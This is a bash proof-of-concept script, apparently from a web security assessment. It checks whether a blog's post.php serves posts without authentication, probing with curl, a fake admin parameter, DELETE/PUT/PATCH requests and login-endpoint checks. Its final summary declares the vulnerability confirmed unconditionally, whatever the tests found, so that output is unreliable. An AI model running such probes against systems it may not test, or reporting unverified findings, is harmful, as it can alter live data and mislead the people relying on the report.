#!/bin/bash

# POC: Missing Authentication - Unauthenticated Access to Blog Posts
# This script demonstrates how all blog posts are accessible without authentication

TARGET="${1:-http://localhost}"
OUTPUT_FILE="/tmp/poc_output.txt"

echo "========================================" > "$OUTPUT_FILE"
echo "Missing Authentication - Blog Post Access POC" >> "$OUTPUT_FILE"
echo "Target: $TARGET" >> "$OUTPUT_FILE"
echo "========================================" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 1: Access blog post without authentication
echo "[*] Test 1: Accessing blog post without authentication" >> "$OUTPUT_FILE"
echo "Request: GET $TARGET/post.php?id=The-Importance-of-Cybersecurity.php" >> "$OUTPUT_FILE"
RESPONSE=$(curl -s -i "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php")
echo "Response Headers:" >> "$OUTPUT_FILE"
echo "$RESPONSE" | head -20 >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Check if we get HTTP 200 and content
if echo "$RESPONSE" | grep -q "200 OK"; then
    echo "[+] SUCCESS: Blog post accessible with HTTP 200" >> "$OUTPUT_FILE"
    if echo "$RESPONSE" | grep -qi "content"; then
        echo "[+] SUCCESS: Post content returned without authentication" >> "$OUTPUT_FILE"
    fi
else
    echo "[-] FAIL: Did not receive HTTP 200 response" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Test 2: Check for authentication headers/cookies
echo "[*] Test 2: Checking for session/authentication headers" >> "$OUTPUT_FILE"
if echo "$RESPONSE" | grep -qi "Set-Cookie"; then
    echo "[-] Found Set-Cookie headers (authentication present)" >> "$OUTPUT_FILE"
else
    echo "[+] No Set-Cookie headers (no session authentication)" >> "$OUTPUT_FILE"
fi

if echo "$RESPONSE" | grep -qi "Authorization"; then
    echo "[-] Found Authorization header (authentication present)" >> "$OUTPUT_FILE"
else
    echo "[+] No Authorization header required" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Test 3: Try accessing with fake authentication parameters
echo "[*] Test 3: Attempting authentication bypass with fake user_id parameter" >> "$OUTPUT_FILE"
echo "Request: GET $TARGET/post.php?id=The-Importance-of-Cybersecurity.php&user_id=admin" >> "$OUTPUT_FILE"
RESPONSE_AUTH=$(curl -s -i "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php&user_id=admin")
if echo "$RESPONSE_AUTH" | grep -q "200 OK"; then
    echo "[+] Still accessible with user_id=admin parameter (parameter ignored)" >> "$OUTPUT_FILE"
else
    echo "[-] Access denied with authentication parameter" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Test 4: Test different HTTP methods
echo "[*] Test 4: Testing different HTTP methods (POST, PUT, DELETE, PATCH)" >> "$OUTPUT_FILE"
for METHOD in POST PUT DELETE PATCH; do
    RESPONSE_METHOD=$(curl -s -i -X "$METHOD" "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php")
    if echo "$RESPONSE_METHOD" | grep -q "200 OK"; then
        echo "[+] HTTP $METHOD returns 200 - processed without authentication" >> "$OUTPUT_FILE"
    else
        HTTP_CODE=$(echo "$RESPONSE_METHOD" | head -1)
        echo "[*] HTTP $METHOD returns: $HTTP_CODE" >> "$OUTPUT_FILE"
    fi
done
echo "" >> "$OUTPUT_FILE"

# Test 5: Verify no authentication endpoints exist
echo "[*] Test 5: Checking for authentication endpoints" >> "$OUTPUT_FILE"
for ENDPOINT in "/login.php" "/admin.php" "/auth.php" "/authenticate.php"; do
    RESPONSE_LOGIN=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT")
    if [ "$RESPONSE_LOGIN" = "404" ]; then
        echo "[+] $ENDPOINT does not exist (HTTP 404)" >> "$OUTPUT_FILE"
    else
        echo "[-] $ENDPOINT exists (HTTP $RESPONSE_LOGIN)" >> "$OUTPUT_FILE"
    fi
done
echo "" >> "$OUTPUT_FILE"

# Test 6: Multiple blog post IDs accessible
echo "[*] Test 6: Testing access to multiple blog post IDs" >> "$OUTPUT_FILE"
POSTS=("The-Importance-of-Cybersecurity.php" "Getting-Started-with-Linux.php" "Web-Security-Essentials.php")
for POST in "${POSTS[@]}"; do
    RESPONSE_POST=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/post.php?id=$POST")
    if [ "$RESPONSE_POST" = "200" ]; then
        echo "[+] Post '$POST' accessible (HTTP 200)" >> "$OUTPUT_FILE"
    else
        echo "[*] Post '$POST' returned HTTP $RESPONSE_POST" >> "$OUTPUT_FILE"
    fi
done
echo "" >> "$OUTPUT_FILE"

# Summary
echo "========================================" >> "$OUTPUT_FILE"
echo "SUMMARY: All blog posts are accessible without authentication" >> "$OUTPUT_FILE"
echo "Vulnerability Confirmed: Missing Authentication Mechanism" >> "$OUTPUT_FILE"
echo "========================================" >> "$OUTPUT_FILE"

cat "$OUTPUT_FILE"
exit 0